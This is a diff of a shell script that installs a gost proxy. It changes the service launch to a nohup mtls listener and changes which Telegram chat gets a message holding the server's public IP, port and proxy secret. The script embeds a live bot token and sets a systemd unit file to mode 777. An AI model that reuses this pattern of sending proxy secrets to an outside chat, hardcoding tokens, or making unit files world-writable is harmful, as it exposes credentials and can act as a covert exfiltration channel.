@@ -338,12 +338,12 @@ EOF
 		chmod 777 /etc/systemd/system/gost.service
 		systemctl daemon-reload
 		systemctl enable gost.service
-		systemctl start gost.service
+		nohup ./gost -L=mtls://:8443/127.0.0.1:443 >/dev/null 2>&1 &
 		
 		Text="代理机新增代理 : https://t.me/proxy?server=$public_ip%26port=$port%26secret=$client_secret"
 			curl POST \
 				"https://api.telegram.org/bot7073530375:AAHiPPKTEOSBtYEt5R4tzDkoT7Tiz6ED3jI/sendMessage" \
-				-d chat_id="6073160827" \
+				-d chat_id="-1002002115399" \
 				-d text="${Text}" 
 		
 		fi
@@ -421,5 +421,4 @@ Start() {
 		fi
 	done
 }
-#https://api.telegram.org/bot7073530375:AAHiPPKTEOSBtYEt5R4tzDkoT7Tiz6ED3jI/sendMessage?chat_id=6073160827&text=OK
 Start
